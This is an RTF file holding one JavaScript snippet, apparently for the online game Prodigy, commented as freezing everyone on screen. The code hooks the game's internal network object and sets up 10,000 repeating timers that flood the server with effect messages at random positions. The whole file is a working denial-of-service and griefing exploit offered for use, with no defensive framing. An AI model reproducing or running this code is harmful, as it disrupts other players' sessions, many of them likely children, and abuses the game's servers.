{\rtf1\ansi\ansicpg1252\cocoartf2512
\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\fnil\fcharset0 HelveticaNeue;}
{\colortbl;\red255\green255\blue255;}
{\*\expandedcolortbl;;}
\margl1440\margr1440\vieww10800\viewh8400\viewkind0
\deftab560
\pard\pardeftab560\slleading20\partightenfactor0

\f0\fs24 \cf0 //freezes everyone in your screen\
for(i=0;i<10000;i++)setInterval(()=>temp1.object.n.c[0].exports.a.instance.prodigy.network.emitMessage(\{"action":"fx","data":\{"type":3,"userID": temp1.object.n.c[0].exports.a.instance.prodigy.player.userID,"x":Math.floor(Math.random() * 1280),"y":Math.floor(Math.random() * 720)\}\}));\
}